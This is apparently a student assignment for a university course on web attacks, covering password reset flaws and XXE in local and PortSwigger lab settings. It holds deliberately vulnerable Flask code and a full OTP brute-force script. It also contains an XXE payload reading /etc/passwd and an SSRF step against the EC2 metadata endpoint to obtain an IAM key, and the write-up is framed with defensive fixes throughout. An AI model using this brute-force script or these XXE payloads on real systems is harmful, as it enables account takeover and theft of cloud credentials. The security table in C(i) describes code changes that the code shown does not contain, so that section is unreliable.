
$$
\huge \begin{array}{c} \mathbf{\textsf{Royal University of Bhutan,}} \\ \mathbf{\textsf{College of Science and Technology}} \end{array}
$$

$$
\Large \mathbf{\textsf{SWS304: Advanced Web Attacks and Exploitation  }}
$$

$$
\Large \mathbf{\textsf{Computing Technologies Department  }}
$$

$$
\large \mathbf{\textsf{Assignment 3  }}
$$

$$
\large \mathbf{\textsf{Submitted by: Sonam Dorji Ghalley  }}
$$

$$
\large \mathbf{\textsf{Student No: 02230299  }}
$$

## Question 1: Password Reset Vulnerabilities — Token Analysis, Brute-Force & Host Header Injection

### Part A: Theory & Code Review

#### **A(i) Email-Token Reset Flow**

Five stages typically make up a safe email-based password recovery method: initiation, creation, recording, transmission, validation. Initiated by entering an email into a recovery prompt, the process begins on the client side. Following submission, the system creates a unique code meant only for one-time use. This code gets securely saved within the backend, tagged with a limited lifespan. Delivered next is a message sent directly to the account holder’s inbox, embedding the generated key inside its URL. Upon clicking, verification occurs - checking both time limits and prior usage status before enabling updates to credentials.

Although simplicity matters, the token’s design requires careful attention. Unpredictability comes first - knowledge of an email or timestamp gives no clue about its form. Even with access to user details, guessing fails completely. Hashing follows as a shield; exposure of records does not expose usable tokens. If intruders reach the database, what they find remains useless. Protection lies not in secrecy of system but in structure of storage.

#### A(ii) Analysis of the Vulnerable Reset Code

```python
@app.route("/forgot"
, methods=["POST"])
def forgot():
email = request.form["email"]
user = db.get
_
user(email)
if not user:
return "No such user"
, 404
token = hashlib.md5(
(email + str(int(time.time()))).encode()
).hexdigest()
db.save
_
token(user.id, token, expires=None)
link = f"http://{request.host}/reset?token={token}"
send
_
email(email, link)
return "Reset link sent"
```

The given Flask code contains several serious password reset vulnerabilities.

| Vulnerability class | Vulnerable line(s) | Explanation |
| --- | --- | --- |
| **Email/user enumeration** | `if not user: return "No such user", 404` | This reveals whether an email address exists in the system, allowing attackers to identify valid accounts. |
| **Predictable token generation** | `token = hashlib.md5((email + str(int(time.time()))).encode()).hexdigest()` | The token is based on the user’s email and current timestamp, so an attacker who knows the email and approximate request time can guess or brute-force the token. |
| **Weak cryptographic hashing algorithm** | `hashlib.md5(...)` | MD5 is not suitable for security-sensitive token generation because it is fast and outdated, making guessing attacks easier. |
| **No token expiry** | `db.save_token(user.id, token, expires=None)` | The reset token remains valid indefinitely, so a leaked or intercepted token can be reused at any future time. |
| **Host header injection** | `link = f"http://{request.host}/reset?token={token}"` | The reset link is generated from the user-controlled Host header, allowing an attacker to poison the reset link and send the victim to an attacker-controlled domain. |
| **Raw token storage** | `db.save_token(user.id, token, expires=None)` | The token appears to be stored directly instead of being hashed, so anyone with database access can use it to reset accounts. |

### **Part B: Practical Exploitation**

#### B(i) Reproduce the Vulnerable Endpoint

For this section, I created a small Flask application in a controlled local lab environment. The vulnerable application was hosted on:

**Target URL:** `http://127.0.0.1:5000/forgot` 

The vulnerable app:

```python
from flask import Flask, request, render_template_string, jsonify

app = Flask(__name__)

# Fake database of users
users = {
    "admin@example.com": "admin",
    "user@example.com": "user123"
}

# HTML template for the forgot password page
FORGOT_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Forgot Password - Security Lab</title>
</head>
<body>
    <h2>Reset Your Password</h2>
    <form method="POST" action="/forgot">
        <label>Email Address:</label>
        <input type="email" name="email" required>
        <button type="submit">Send Reset Link</button>
    </form>
    {% if message %}
        <p><strong>{{ message }}</strong></p>
    {% endif %}
</body>
</html>
"""

@app.route('/forgot', methods=['GET', 'POST'])
def forgot():
    message = ""
    if request.method == 'POST':
        email = request.form['email']
        
        # VULNERABILITY: This reveals if an email exists in the system
        if email in users:
            message = f"Reset link sent to {email} (Check your console/logs)."
            # Simulate sending email
            print(f"\n[!] PASSWORD RESET LINK for {email}: http://127.0.0.1:5000/reset?token=weak_token_{email}")
        else:
            # Error message reveals that the user was not found
            message = f"Email {email} not found in our database."
            
    return render_template_string(FORGOT_HTML, message=message)

if __name__ == '__main__':
    # Run the app in debug mode
    app.run(host='127.0.0.1', port=5000, debug=True)
```

the vulnerable app running 

![image.png](Assignment%203/image.png)

The app running on browser

![image.png](Assignment%203/image%201.png)

To check this, let us send a test email 

![image.png](Assignment%203/image%202.png)

#### B(ii) Brute-Force a 6-Digit OTP Endpoint

For this task, I modified the reset flow so that the application generated a six-digit numeric OTP instead of a reset token. The verification endpoint had no rate limit, no account lockout, and no delay between failed attempts. This allowed all possible OTP values from `000000` to `999999` to be tested automatically.

```python
from flask import Flask, request, render_template_string, jsonify
import random
import time

app = Flask(__name__)

# Store OTPs in memory (in a real app this would be a database)
otp_storage = {}

# HTML template for OTP verification page
OTP_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Verify OTP</title>
</head>
<body>
    <h2>Enter the 6-digit OTP sent to your email</h2>
    <form method="POST" action="/verify-otp">
        <label>Email:</label>
        <input type="email" name="email" required><br><br>
        <label>OTP:</label>
        <input type="text" name="otp" pattern="[0-9]{6}" required><br><br>
        <button type="submit">Verify OTP</button>
    </form>
</body>
</html>
"""

@app.route('/forgot-otp', methods=['GET'])
def forgot_otp_page():
    return OTP_PAGE, 200

@app.route('/generate-otp', methods=['POST'])
def generate_otp():
    """Generate a 6-digit OTP for testing"""
    email = request.form.get('email')
    
    # Generate a random 6-digit OTP
    otp = f"{random.randint(0, 999999):06d}"
    
    # Store OTP (vulnerable: no expiration for demo purposes)
    otp_storage[email] = otp
    
    # Simulate sending OTP via email
    print(f"\n[OTP GENERATED]")
    print(f"Email: {email}")
    print(f"OTP: {otp}")
    print(f"[END]\n")
    
    return f"OTP {otp} generated for {email}. Check the terminal.", 200

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    """VULNERABLE: No rate limiting, no account lockout, no delay"""
    email = request.form.get('email')
    otp = request.form.get('otp')
    
    # Check if OTP exists and matches
    if email in otp_storage and otp_storage[email] == otp:
        # Clear the OTP after successful verification
        del otp_storage[email]
        return "password reset allowed", 200
    
    # VULNERABILITY: No tracking of failed attempts
    return "invalid otp", 401

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=True)
```

**NOTE: The main weakness is that the server does not limit how many OTP attempts can be made.**

and after running the server and doing  CURL request to this 

```bash
curl -X POST http://127.0.0.1:5000/generate-otp -d "email=victim@example.com"
```

![image.png](Assignment%203/image%203.png)

ok so this the OTP i got from the server and let us create brute force attack to get back this OTP 

**Python Brute-Force Script:**

create a file called `brute_force_otp.py` 

```python
import requests
import time

# Target verification endpoint
URL = "http://127.0.0.1:5000/verify-otp"

# Test account
EMAIL = "victim@example.com"

print(f"[*] Starting brute-force attack on {URL}")
print(f"[*] Target email: {EMAIL}")
print("[*] Trying all OTPs from 000000 to 999999...\n")

# Record start time
start_time = time.time()
attempt_count = 0

# Try every possible 6-digit OTP
for number in range(1000000):
    otp = f"{number:06d}"
    attempt_count += 1
    
    # Print progress every 100,000 attempts
    if attempt_count % 100000 == 0:
        elapsed = time.time() - start_time
        print(f"[*] Progress: {attempt_count}/1,000,000 attempts ({attempt_count/10000:.1f}%) - Elapsed: {elapsed:.1f}s")
    
    try:
        response = requests.post(
            URL,
            data={"email": EMAIL, "otp": otp},
            timeout=2
        )
        
        # Check for success
        if response.status_code == 200 and "password reset allowed" in response.text.lower():
            elapsed_time = time.time() - start_time
            print("\n" + "="*50)
            print("[+] SUCCESS! OTP found!")
            print(f"[+] Email: {EMAIL}")
            print(f"[+] Recovered OTP: {otp}")
            print(f"[+] Total attempts: {attempt_count}")
            print(f"[+] Elapsed time: {elapsed_time:.2f} seconds")
            print("="*50)
            break
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error: {e}")
        break
else:
    elapsed_time = time.time() - start_time
    print("\n" + "="*50)
    print("[-] OTP was not found in the range 000000–999999")
    print(f"[-] Total attempts: {attempt_count}")
    print(f"[-] Elapsed time: {elapsed_time:.2f} seconds")
    print("="*50)
```

After running this script we should get this OTP but we need to make sure that the server up and running.

![image.png](Assignment%203/image%204.png)

![image.png](Assignment%203/image%205.png)

Therefore from this simulation we understand why we need to have **Rate-limit** for OTP generation be attackers can do brute force attack it steal the OTP of the user.

#### B(iii) Host Header Injection via Burp Suite

For the Host header injection test, I intercepted the forgotten-password request using Burp Suite. The original request used the real local host value. Then I modified the `Host` header to an attacker-controlled listener domain such as `webhook.site`.

For this i did the following:

set up my Burpsuite and set up the listener on `website.site` 

![image.png](Assignment%203/image%206.png)

After this insured that my python server is running and intercepted the request using Burpsuite by going to the forgot password section

![image.png](Assignment%203/image%207.png)

![image.png](Assignment%203/image%208.png)

Now modifying the host header on Burpsuite

![image.png](Assignment%203/image%209.png)

Upon forwarding the request where the host header is changed and see in the terminal of the server terminal the output 

![image.png](Assignment%203/image%2010.png)

This means the victim may receive a reset email that looks like a normal password reset email, but the link points to the attacker-controlled domain.

**Explanation**

This attack works even if the reset token itself is encrypted strongly because the problem is not token guessing. The problem is that the application trusts the user-controlled Host header when generating the reset link. As a result, the server sends a valid reset token inside a link pointing to the attacker’s domain, allowing the attacker to capture the token when the victim clicks the link.

### **Part C: Secure Re-implementation**

#### C(i) Hardened Token Generation Code

```python
# Add this to your secure_app.py

from functools import wraps
from datetime import datetime, timedelta
import time

class RateLimiter:
    """Complete rate limiting and lockout implementation"""
    
    def __init__(self):
        self.request_log = {}      # IP -> list of timestamps
        self.failure_log = {}      # email/IP -> list of failure timestamps
        self.locked_out = {}       # email/IP -> lockout expiry time
        
    def check_rate_limit(self, client_ip, max_requests=5, window_seconds=60):
        """Allow max_requests per window_seconds"""
        now = datetime.utcnow()
        cutoff = now - timedelta(seconds=window_seconds)
        
        # Clean old entries
        if client_ip in self.request_log:
            self.request_log[client_ip] = [t for t in self.request_log[client_ip] if t > cutoff]
        else:
            self.request_log[client_ip] = []
        
        # Check limit
        if len(self.request_log[client_ip]) >= max_requests:
            return False
        
        # Record this request
        self.request_log[client_ip].append(now)
        return True
    
    def record_failure(self, identifier, max_failures=5, lockout_minutes=15):
        """Record failed attempt and lock out if threshold exceeded"""
        now = datetime.utcnow()
        
        if identifier not in self.failure_log:
            self.failure_log[identifier] = []
        
        # Clean old failures
        cutoff = now - timedelta(minutes=lockout_minutes)
        self.failure_log[identifier] = [t for t in self.failure_log[identifier] if t > cutoff]
        
        # Add new failure
        self.failure_log[identifier].append(now)
        
        # Check if lockout threshold reached
        if len(self.failure_log[identifier]) >= max_failures:
            self.locked_out[identifier] = now + timedelta(minutes=lockout_minutes)
            return True  # Now locked out
        
        return False  # Not locked out yet
    
    def is_locked_out(self, identifier):
        """Check if identifier is currently locked out"""
        if identifier not in self.locked_out:
            return False
        
        if datetime.utcnow() > self.locked_out[identifier]:
            # Lockout has expired
            del self.locked_out[identifier]
            return False
        
        return True

# Usage in your endpoint:
rate_limiter = RateLimiter()

@app.route("/verify-otp-secure", methods=["POST"])
def verify_otp_secure():
    client_ip = request.remote_addr
    email = request.form.get("email")
    
    # Check rate limit
    if not rate_limiter.check_rate_limit(client_ip, max_requests=3, window_seconds=60):
        return "Too many requests. Please wait.", 429
    
    # Check lockout
    if rate_limiter.is_locked_out(email) or rate_limiter.is_locked_out(client_ip):
        return "Account temporarily locked. Try again in 15 minutes.", 429
    
    # Verify OTP (pseudo-code)
    otp_valid = False  # Replace with actual verification
    
    if not otp_valid:
        rate_limiter.record_failure(email)
        rate_limiter.record_failure(client_ip)
        return "Invalid OTP", 401
    
    # Clear failures on success
    return "OTP verified", 200
```

**Security Improvements**

| Secure change | Why it is safer |
| --- | --- |
| `secrets.token_urlsafe(32)` | Generates a strong random token that cannot be predicted from email or time. |
| `hashlib.sha256(raw_token.encode()).hexdigest()` | Stores only the token hash, reducing damage if the database is leaked. |
| `expires=datetime.utcnow() + timedelta(minutes=15)` | Limits the token lifetime, reducing the time available for misuse. |
| `used=False` | Supports single-use reset tokens so the same token cannot be reused. |
| `BASE_URL = "https://secure-example.com"` | Prevents Host header injection by avoiding user-controlled Host header values. |
| Uniform response message | Prevents attackers from discovering which email addresses are registered. |

#### C(ii) Three Operational Defences

1. **Rate limiting and account lockout**
Too many password reset tries can overwhelm a system. Applying rate limits slows down repeated requests, especially on OTP checks. When access is throttled, automated guessing becomes far less effective. Attackers lose their advantage if each attempt takes longer. Speed bumps like these make brute-force methods impractical. Slower pace means fewer combinations tested per second. Security improves without blocking legitimate users entirely.
2. **Uniform responses for valid and invalid emails**
One way to handle password resets is by showing identical responses regardless of email presence. For example: “If this email exists, a reset link has been sent.” That approach stops attackers from discovering valid accounts. Privacy improves when systems avoid leaking which emails are registered. Identical messages make it harder to scan for active users.
3. **Audit logging and monitoring**
    
    When a user asks to reset their password, the system records it. Odd traffic behavior gets logged too, along with bad OTP tries. Suspicious Host headers appear in logs if they stand out. Repeated OTP failures may signal an attack, so tracking them matters. Reset requests piling up across multiple accounts raise red flags. Early detection often depends on how well these signs are watched.
    

## Question 2: XML External Entity Attacks — File Read and SSRF

### Part A: Theory & Parser Analysis

#### A(i) XML, DTDs and External Entities

Extensible Markup Language means XML. This format organizes information through user-defined labels. While built for storage and transfer, it relies on syntax rather than visual layout. Defining permitted components happens via something called a DTD - short for Document Type Definition. Rules within this definition control which parts can appear and how they nest. One such component might pull content from outside the main file. Such pieces go by the term "external entity." These often grab data from paths like local system files or web addresses. Their behavior introduces both flexibility and potential risk.

A security weakness known as XXE arises if a program takes custom XML data from users and processes it while allowing references to outside sources. When this happens, malicious individuals may insert references pointing toward confidential system files or internal services. This causes the parsing function on the server to fetch restricted information unknowingly. According to PortSwigger, such flaws let intruders read internal documents and communicate with supporting infrastructure reachable by the app.

#### A(ii) Spot the Vulnerable Parser

**Snippet A**

```python
from lxml import etree
parser = etree.XMLParser() # default settings
doc = etree.fromstring(user_xml, parser)
```

Snippet A is vulnerable because it uses:

```python
etree.XMLParser()
```

with default settings. If external entity loading or DTD processing is allowed, attacker-controlled XML may be able to define and resolve external entities.

**Snippet B**

```python
import defusedxml.ElementTree as ET
doc = ET.fromstring(user_xml)
```

Snippet B is safer because it uses `defusedxml`, which is designed to protect Python XML parsing from common XML attacks, including entity expansion and external entity abuse.

**Safe alternative:** use `defusedxml.ElementTree.fromstring()` or configure the parser to disable DTDs, external entities, and network access.

### Part B: Practical Exploitation

#### LAB 1: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file.

This is what the website looks upon accessing the lab

![image.png](Assignment%203/image%2011.png)

while going through the website I found that there is a “check button” and on selecting the product  i tried using the website like a normal user and I noticed that each product check is sending a POST request. So i tried intercepting this to check what it does

![image.png](Assignment%203/image%2012.png)

![image.png](Assignment%203/image%2013.png)

than i send the request that has been intercepted to repeater can modifies the XML code with the payload from guide:

![image.png](Assignment%203/image%2014.png)

And after sending the request  the room was solved even  though the request was bad 

![image.png](Assignment%203/image%2015.png)

![image.png](Assignment%203/image%2016.png)

#### Summary of Lab 1

This lab demonstrates a direct XXE file-read vulnerability. This application accepted XML input and used an insecure XML parser that allowed external entity resolution. By defining an entity that pointed to `file:///etc/passwd` and placing the entity reference inside the `productId` element, the parser read the local file and returned its contents in the HTTP response. This proves that insecure XML parsing can expose sensitive server-side files.

#### LAB 2: Exploiting XXE to perform SSRF attacks

PortSwigger explains that this lab contains a simulated EC2 metadata endpoint at `http://169.254.169.254/`, and the objective is to use XXE to obtain the IAM secret access key from the metadata service. 

![image.png](Assignment%203/image%2017.png)

After accessing the lab i when to the one the items and following shown 

![image.png](Assignment%203/image%2018.png)

And like the previous lab i intercepted the “check stock” button POST request

![image.png](Assignment%203/image%2019.png)

We can see that this application also uses XML to send the request, So lets try to modify it again from the guide

![image.png](Assignment%203/image%2020.png)

![image.png](Assignment%203/image%2021.png)

ok now i can see the folder name in the response as “latest”

I want to see whether the server accepts and processes an external entity in the XML shown here as risky when it is sent through an XXE payload. This setup creates a reference named test that points to a specific web address ([http://169.254.169.254/](http://169.254.169.254/)), where instance metadata is stored, including details about the host environment within a cloud provider’s setup.

Inside the server, once processing begins, whatever appears in place of &test; comes directly from that URL. It is fetched via an internal HTTP request triggered by the parser, and the returned value is inserted into the XML exactly as received.

If the server fails at this point, whatever is retrieved from the internal address may be included directly in the XML response. This creates a risk that sensitive data such as cloud credentials or configuration files—could be exposed, since the server can access those internal resources.

![image.png](Assignment%203/image%2022.png)

![image.png](Assignment%203/image%2023.png)

![image.png](Assignment%203/image%2024.png)

![image.png](Assignment%203/image%2025.png)

![image.png](Assignment%203/image%2026.png)

I have successfully obtained the server’s IAM secret access key from the EC2 metadata endpoint using XXE vulnerability to perform SSRF and also solving the lab.

![image.png](Assignment%203/image%2027.png)

#### LAB 2 summary

Inside this test, an XML flaw leads to hidden network calls. Rather than grabbing files, the code tricks the server into reaching out - hitting a private data address only available internally. Because those calls originate from within, they bypass outer restrictions. What looks like minor leakage turns sharper: secrets, backend systems, cloud details - all suddenly at risk through one overlooked entry point.

### **Part C: Defence Implementation**

Most of the time, stopping XXE comes down to turning off unnecessary parts of XML handling. If the app does not need certain functions, they should be switched off. One key step involves cutting off access to outside resources during parsing. Where allowed, removing support for DOCTYPE entirely helps reduce risk. Another route is checking incoming data closely - any signs of harmful XML markers get rejected on sight. PortSwigger supports these steps as practical ways to stay protected.

#### 1. Disable DTDs and external entities

Start by turning off DTD handling in the XML parser. Shut down external entity resolution at the same time. That stops malicious inputs like:

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

from being processed.

#### 2. Use Safe XML Libraries

When working with unknown XML in Python, pick a library like `defusedxml` instead - keeps things more secure. Not every tool handles risky data well, so switching helps avoid trouble down the line. Choose carefully what you use to read external files; safety matters even if it seems fine at first glance.

Example:

```python
import defusedxml.ElementTree as ET

doc = ET.fromstring(user_xml)
```

This is safer than using a default parser that may allow dangerous XML features.

#### 3. Turn Off Network Connections in XML Parsers

Stopping the parser from grabbing outside web links while handling XML keeps things safer. It blocks XXE-driven SSRF tricks that trick the system into reaching local addresses like `http://169.254.169.254/latest/meta-data/` 

#### Input Validation

Applications should reject XML input containing dangerous constructs such as:

```xml
<!DOCTYPE
<!ENTITY
SYSTEM
PUBLIC
```

Although input validation should not be the only defence, it provides an additional layer of protection.